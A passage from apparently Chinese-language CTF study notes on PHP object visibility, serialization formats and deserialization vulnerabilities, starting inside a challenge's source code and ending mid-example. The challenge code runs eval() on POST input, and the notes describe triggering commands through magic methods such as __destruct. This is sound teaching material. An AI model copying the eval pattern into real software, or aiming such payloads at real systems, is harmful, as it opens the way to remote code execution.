<span class="title">FLAG</span></span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_protected_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_private_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(); </span><br><span class="line"><span class="variable">$sub_target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SubFLAG</span>(); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Trying to get FLAG...&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Public Flag: &quot;</span>.<span class="variable">$target</span>-&gt;public_flag.<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Protected Flag:&quot;</span>.<span class="variable">$target</span>-&gt;protected_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Private Flag:&quot;</span>.<span class="variable">$target</span>-&gt;private_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">Trying to get FLAG...</span><br><span class="line">Public Flag: NSSCTF&#123;se3_me_</span><br><span class="line">Protected Flag: <span class="built_in">Error</span>: Cannot access <span class="keyword">protected</span> property FLAG:: in ? </span><br><span class="line">Private Flag: <span class="built_in">Error</span>: Cannot access <span class="keyword">private</span> property FLAG:: in ? </span><br><span class="line">...Wait,where is the flag?</span><br></pre></td></tr></table></figure>

<p>看网页回显，在我们不为 code 赋值时，可以直接用箭头访问的只有 public 变量，且题中有一个 FLAG 的子类 SubFLAG</p>
<p>这里子类是可以随便调用父类函数的，全是 public，在外部都可以</p>
<p><strong>则能输出 public_flag 的方法:</strong></p>
<p>$target-&gt;public_flag</p>
<p>$sub_target-&gt;public_flag</p>
<p><strong>能输出 Protected Flag 的方法:</strong></p>
<p>$target-&gt;get_protected_flag()</p>
<p>$sub_target-&gt;get_protected_flag() &#x2F;&#x2F;这里是调用了父类的成员函数</p>
<p>$sub_target-&gt;show_protected_flag()</p>
<p><strong>能输出 Privated flag 的方法:</strong></p>
<p>$target-&gt;get_private_flag()</p>
<p>$sub_target-&gt;get_private_flag()</p>
<p>$sub_target-&gt;show_private_flag()是绝对不行的，因为函数内部就出现了问题，即使在类内也不能调用父类的 privated 变量</p>
<h4 id="拓展-父子类和嵌套类的区别"><a href="#拓展-父子类和嵌套类的区别" class="headerlink" title="拓展:父子类和嵌套类的区别"></a>拓展:父子类和嵌套类的区别</h4><ol>
<li>父类与子类是「继承关系」：子类是父类的 “一种”，能继承和扩展父类的功能；</li>
<li>类中类是「包含关系」：内部类是外部类的 “一个组件”，嵌套类不会因为写在外部类里，就自动成为外部类的子类，只是代码嵌套；</li>
</ol>
<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>PHP 中 “对象” 不能直接存储（比如存文件）或传输（比如传给其他页面），于是有了 “序列化” 和 “反序列化”—— 本质是 “对象的格式转换工具”。</p>
<p><code>serialize()</code>：接收任意 PHP 数据（对象 &#x2F; 数组 &#x2F; 字符串等），返回<strong>固定格式的序列化字符串</strong>；</p>
<p><code>unserialize()</code>：接收合法序列化字符串，返回对应的<strong>原始数据类型</strong>（对象 &#x2F; 数组 &#x2F; 字符串等）；若字符串格式非法，返回 <code>false</code>。</p>
<h3 id="序列化（serialize-函数–对象-→-字符串"><a href="#序列化（serialize-函数–对象-→-字符串" class="headerlink" title="序列化（serialize () 函数–对象 → 字符串"></a>序列化（serialize () 函数–对象 → 字符串</h3><p>把 “对象” 转换成一串特殊格式的字符串，方便存储 &#x2F; 传输，用法：</p>
<p><img src="/images/LwVtbX8Kfoh3lexYouYc6gRXnhh.png"></p>
<p>输出结果（格式化后方便看）：</p>
<p><img src="/images/J35JbiRnSomCK8xybalctO4RnKf.png"></p>
<p>字符串含义（记熟这个格式，后续构造 payload 要用）：(这里要注意中文是 1 字 3 字符)</p>
<p><img src="/images/J5tYb2rJiowzeSxTqlucIpF6nYe.png"></p>
<p>序列化字符串中，<code>{}</code> 包裹的<strong>属性区域</strong>，永远遵循「属性名定义 → 属性值定义」的成对逻辑，不管有多少个属性，都是这个循环：</p>
<p><img src="/images/PDSfbOniJovwaYx0wJDc0kQ8nnd.png"></p>
<h3 id="反序列化（unserialize-函数）：字符串-→-对象"><a href="#反序列化（unserialize-函数）：字符串-→-对象" class="headerlink" title="反序列化（unserialize () 函数）：字符串 → 对象"></a>反序列化（unserialize () 函数）：字符串 → 对象</h3><p>把 “序列化字符串” 还原成原来的对象，用法：</p>
<p><img src="/images/JVdfb4wwWoCOi5xNd7LcrJ8ond4.png"></p>
<ul>
<li>关键：反序列化会完整还原对象的 “属性值” 和 “类关联”—— 只要字符串格式正确，就能还原出和原来一样的对象，这也是漏洞的关键（攻击者可构造恶意字符串，还原出含危险属性的对象）。</li>
</ul>
<h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h3><p>序列化是 “对象变字符串”（存 &#x2F; 传），反序列化是 “字符串变对象”（用），二者是 PHP 中对象 “存储 - 传输 - 复用” 的核心机制。</p>
<h2 id="反序列化存在的漏洞"><a href="#反序列化存在的漏洞" class="headerlink" title="反序列化存在的漏洞"></a>反序列化存在的漏洞</h2><p>先明确：<strong>序列化和反序列化本身不是漏洞</strong>，漏洞的根源是 “两个条件的叠加”：</p>
<ol>
<li><strong>反序列化的输入可控</strong>：<code>unserialize()</code> 的参数（序列化字符串）是攻击者能修改的（比如通过 GET&#x2F;POST 传参，如 <code>unserialize($_GET[&#39;data&#39;])</code>）；</li>
<li><strong>代码中存在 “危险魔术方法”</strong>：反序列化过程中会自动触发某些 “魔术方法”，如果这些方法里有 <code>eval()</code>、<code>file_get_contents()</code>、<code>system()</code> 等危险函数，攻击者就能通过构造字符串触发这些函数，实现恶意操作。</li>
</ol>
<p><img src="/images/HUa1b2fnooitxxxhTWIcRsD8nBg.png"></p>
<ul>
<li>攻击者只要构造含 <code>$cmd=&quot;ls&quot;</code>（或其他命令）的序列化字符串，传给 <code>data</code> 参数，反序列化后触发 <code>__destruct()</code>，就能执行 <code>ls</code> 命令 —— 这就是最基础的反序列化漏洞利用。</li>
</ul>
<h2 id="数组的反序列化"><a href="#数组的反序列化" class="headerlink" title="数组的反序列化"></a>数组的反序列化</h2><p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/FxQ9wEdDOivTSCk72SocOaVenoh">前置:python 字典和 php 数组</a></p>
<p><img src="/images/AuQAbMrxHorkYqxIFXyclJqZnAu.png"></p>
<p>上面对数组的反序列化会输出：</p>
<p><img src="/images/KOYtbquYJo3BYsxLbQ6cgtVsnub.png"></p>
<p>在上面反序列化中的字符中，每个部分代表不同的属性：</p>
<p><img src="/images/QxaJbkma5oyEsBximMociLZLnFc.png"></p>
<p>以此类推</p>
<h2 id="普通对象的反序列化"><a href="#普通对象的反序列化" class="headerlink" title="普通对象的反序列化"></a><strong>普通对象的反序列化</strong></h2><p><em>序列化字符串中，_<em>{}</em></em> 包裹的_<strong>属性区域</strong><em>，永远遵循「属性名定义 → 属性值定义」的成对逻辑，不管有多少个属性，都是这个循环：</em></p>
<p>先来复习一下格式</p>
<p><img src="/images/WFfMbUSvVo2aG0xJ1k0cMaRSnBh.png"></p>
<p>此时我们如果采用数组为姓名变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user = new User(array(&quot;Probius&quot;,&quot;Official&quot;));</span><br></pre></td></tr></table></figure>

<p>则再次运行，输出就变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:7:&quot;Probius&quot;;i:1;s:8:&quot;Official&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WehjbaIlQo9y1LxBQPqcSqilnWc.png"></p>
<p>我们针对上面的代码，添加点类中的其他属性，如：<code>保护变量</code> <code>私有变量</code> <code>自定义函数</code></p>
<p><img src="/images/XkgfbNZUUoZggZxUsmAcW0wQnpv.png"></p>
<p>其输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;</span><br><span class="line">s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;</span><br><span class="line">&#125;</span><br><span class="line">s:8:&quot; * email&quot;;</span><br><span class="line">s:17:&quot;admin@probius.xyz&quot;;</span><br><span class="line">s:17:&quot; User phoneNumber&quot;;</span><br><span class="line">s:11:&quot;19191145148&quot;;</span><br><span class="line">&#125;</span><br><span class="line">Array</span><br><span class="line">(    </span><br><span class="line">    [0] =&gt; tan    </span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148</span><br></pre></td></tr></table></figure>

<p>观察不同类型变量名的字符长度标识，你会发现长度和你看到的好像有些不一样，那是因为在 <code>protected</code> 和 <code>private</code> 类型的变量中都加入了不可见字符：</p>
<p>如果是 <code>protected</code> 变量，则会在变量名前加上 <code>\x00*\x00</code></p>
<p>如果是 <code>private</code> 变量，则会在变量名前加上 <code>\x00类名</code></p>
<p><img src="/images/MKkbb9MXdodvS8x7ZAxc6qEQnIc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;---------- public$name;</span><br><span class="line">s:8:&quot;\x00*\x00email&quot;;s:17:&quot;admin@probius.xyz&quot;;---------------------- protected$email;</span><br><span class="line">s:17:&quot;\x00User\x00phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;----------------- private $phoneNumber;</span><br></pre></td></tr></table></figure>

<p><code>echo  urlencode($serializedData)</code> :</p>
<p>输出 O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22tan%22%3Bi%3A1%3Bs%3A2%3A%22ji%22%3B%7D————————————————————– public $name;</p>
<p>s%3A8%3A%22%00%2A%00email%22%3Bs%3A17%3A%22admin%40probius.xyz%22%3B——- protected $email;</p>
<p>s%3A17%3A%22%00User%00phoneNumber%22%3Bs%3A11%3A%2219191145148%22%3B%7D—- private $phoneNumber;</p>
<h2 id="自定义类的反序列化"><a href="#自定义类的反序列化" class="headerlink" title="自定义类的反序列化"></a><strong>自定义类的反序列化</strong></h2><p>如果我们把上面的类改成这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 1. 定义User类，同时声明：这个类要自己控制序列化/反序列化（implements Serializable）</span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line">    // 2. 定义3个属性（就是对象的“存储容器”，存名字、邮箱、手机号）</span><br><span class="line">    public <span class="variable">$name</span>;       // 公开属性：存名字（比如数组[<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]）</span><br><span class="line">    protected <span class="variable">$email</span>;   // 受保护属性：存邮箱（比如admin@probius.xyz）</span><br><span class="line">    private <span class="variable">$phoneNumber</span>;// 私有属性：存手机号（比如19191145148）</span><br><span class="line"></span><br><span class="line">    // 3. 构造方法：创建User对象时，自动给3个属性赋值（相当于“初始化容器”）</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>, <span class="variable">$email</span>, <span class="variable">$phoneNumber</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;          // 把传入的<span class="variable">$name</span>值，放进当前对象的<span class="variable">$name</span>属性里</span><br><span class="line">        <span class="variable">$this</span>-&gt;email = <span class="variable">$email</span>;        // 把传入的<span class="variable">$email</span>值，放进当前对象的<span class="variable">$email</span>属性里</span><br><span class="line">        <span class="variable">$this</span>-&gt;phoneNumber = <span class="variable">$phoneNumber</span>; // 把传入的手机号，放进当前对象的<span class="variable">$phoneNumber</span>属性里</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 4. 自定义序列化方法：告诉PHP“怎么打包这个对象”（核心！）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">serialize</span></span>() &#123;</span><br><span class="line">        // 把3个属性装进一个数组，然后用serialize()打包成字符串</span><br><span class="line">        <span class="built_in">return</span> serialize([</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;name,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;email,</span><br><span class="line">            <span class="string">&#x27;phoneNumber&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;phoneNumber,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 5. 自定义反序列化方法：告诉PHP“怎么拆包还原对象”（核心！）</span><br><span class="line">    public <span class="keyword">function</span> unserialize(<span class="variable">$serialized</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span> = unserialize(<span class="variable">$serialized</span>); // 先把打包的字符串拆成数组</span><br><span class="line">        // 把数组里的值，重新放回对象的3个属性里（还原数据）</span><br><span class="line">        <span class="variable">$this</span>-&gt;name = <span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;email = <span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;phoneNumber = <span class="variable">$data</span>[<span class="string">&#x27;phoneNumber&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 6. 辅助方法1：输出手机号（<span class="built_in">echo</span>直接打印）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getPhoneNumber</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 7. 辅助方法2：返回邮箱（<span class="built_in">return</span>是“把值交出去”，不是直接打印）</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getEmail</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 8. 创建User对象：调用构造方法，给3个属性传值</span><br><span class="line">//  name = [<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]，email = admin@probius.xyz，phoneNumber = 19191145148</span><br><span class="line"><span class="variable">$user</span> = new User(array(<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>), <span class="string">&#x27;admin@probius.xyz&#x27;</span>, <span class="string">&#x27;19191145148&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// 9. 序列化（打包）：调用User类自己的serialize()方法，把对象转成字符串</span><br><span class="line"><span class="variable">$serializedData</span> = serialize(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">// 10. 打印打包后的字符串（就是咱们之前拆的C:4:<span class="string">&quot;User&quot;</span>:125:&#123;...&#125;）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">// 11. 反序列化（拆包）：调用User类自己的unserialize()方法，把字符串还原成对象</span><br><span class="line"><span class="variable">$deserializedUser</span> = unserialize(<span class="variable">$serializedData</span>);</span><br><span class="line"></span><br><span class="line">// 12. 打印还原后的name属性（数组[<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>]，print_r专门打印数组）</span><br><span class="line">print_r(<span class="variable">$deserializedUser</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">// 13. 调用还原后对象的getPhoneNumber()方法，打印手机号（19191145148）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getPhoneNumber() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">// 14. 调用getEmail()方法，获取邮箱并打印（admin@probius.xyz）</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getemail() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在 User 类中，通过 <code>class User implements Serializable</code> 中的 <code>Serializable</code> 接口，我们可以定义 <code>serialize()</code> 和 <code>unserialize()</code> 两个方法，实现控制类实例在序列化和反序列化过程中的行为。</p>
<p>这两个方法分别负责将类实例的属性序列化为字符串和从字符串中还原属性。</p>
<p>当我们使用全局的 <code>serialize()</code> 和 <code>unserialize()</code> 函数时，这些方法会自动调用，从而让我们更好地控制序列化和反序列化过程。这也是该类型的类叫做 “CustomObject” 的原因。</p>
<p>即</p>
<ol>
<li><code>implements Serializable</code> &#x3D; 告诉 PHP：这个类的打包 &#x2F; 拆包我自己说了算；</li>
<li><code>serialize()</code> &#x3D; 定义 “怎么打包”，<code>unserialize()</code> &#x3D; 定义 “怎么拆包”；这两个方法里的逻辑，本质就是 “把属性装进数组 &#x2F; 从数组拿出来”，和普通的赋值没区别。</li>
</ol>
<p>当我们运行上面的程序时，控制台输出如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:4:<span class="string">&quot;User&quot;</span>:125:&#123;a:3:&#123;s:4:<span class="string">&quot;name&quot;</span>;a:2:&#123;i:0;s:3:<span class="string">&quot;tan&quot;</span>;i:1;s:2:<span class="string">&quot;ji&quot;</span>;&#125;s:5:<span class="string">&quot;email&quot;</span>;s:17:<span class="string">&quot;admin@probius.xyz&quot;</span>;s:11:<span class="string">&quot;phoneNumber&quot;</span>;s:11:<span class="string">&quot;19191145148&quot;</span>;&#125;&#125; ---------------------------------------------------- <span class="built_in">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">Array ------------------------------------------------ print_r(<span class="variable">$deserializedUser</span>-&gt;name);</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; tan</span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148 ------------------------------------------ <span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getPhoneNumber() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">admin@probius.xyz ------------------------------------ <span class="built_in">echo</span> <span class="variable">$deserializedUser</span>-&gt;getemail() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其格式大致为：<code>C:&lt;className length&gt;:&quot;&lt;class name&gt;&quot;:&lt;data length&gt;:{&lt;data&gt;}</code></p>
<p>即</p>
<p><img src="/images/Ds6ybkZUSo3SIGxkNmbcxkC2ng1.png"></p>
<h2 id="其他标识"><a href="#其他标识" class="headerlink" title="其他标识"></a>其他标识</h2><p><a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/php_unser_base/#_4">其他标识</a></p>
<h1 id="Week7-2-魔术方法和基础漏洞举例"><a href="#Week7-2-魔术方法和基础漏洞举例" class="headerlink" title="[Week7.2]魔术方法和基础漏洞举例"></a>[Week7.2]魔术方法和基础漏洞举例</h1><p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（<code>__</code>）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p>
<p>一般在题目中常见的几个方法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//------ 执行unserialize()时，先会调用这个函数</span></span><br><span class="line"> <span class="title function_ invoke__">__sleep</span>() <span class="comment">//------- 执行serialize()时，先会调用这个函数</span></span><br><span class="line"> <span class="title function_ invoke__">__destruct</span>() <span class="comment">//---- 对象被销毁时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__call</span>() <span class="comment">//-------- 在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__callStatic</span>() <span class="comment">//-- 在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__get</span>() <span class="comment">//--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span></span><br><span class="line"> <span class="title function_ invoke__">__set</span>() <span class="comment">//--------- 用于将数据写入不可访问的属性</span></span><br><span class="line"> <span class="title function_ invoke__">__isset</span>() <span class="comment">//------- 在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"> <span class="title function_ invoke__">__unset</span>() <span class="comment">//------- 在不可访问的属性上使用unset()时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__toString</span>() <span class="comment">//---- 把类当作字符串使用时触发</span></span><br><span class="line"> <span class="title function_ invoke__">__invoke</span>() <span class="comment">//------ 当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>一份比较全面的表格：</p>
<p><em>PHP 官方文档已经很详细了，这里不再赘述，不一定需要学会所有的函数，除开常见的，其他的在遇到的时候查阅即可。</em></p>
<h2 id="魔术方法展开说明"><a href="#魔术方法展开说明" class="headerlink" title="魔术方法展开说明"></a>魔术方法展开说明</h2><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><blockquote>
<p>PHP 允许开发者在一个类中定义一个方法作为 ** 构造函数 **（__construct）。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: &quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>(<span class="string">&quot;我是&quot;</span>, <span class="string">&quot;理塘&quot;</span>, <span class="string">&quot;丁真&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getAll</span>();</span><br></pre></td></tr></table></figure>

<p>他将输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A: 我是</span><br><span class="line">B: 理塘</span><br><span class="line">C: 丁真</span><br></pre></td></tr></table></figure>

<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><blockquote>
<p>PHP 有 ** 析构函数 **（__destruct）的概念，这类似于其它面向对象的语言，如 C++。<strong>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 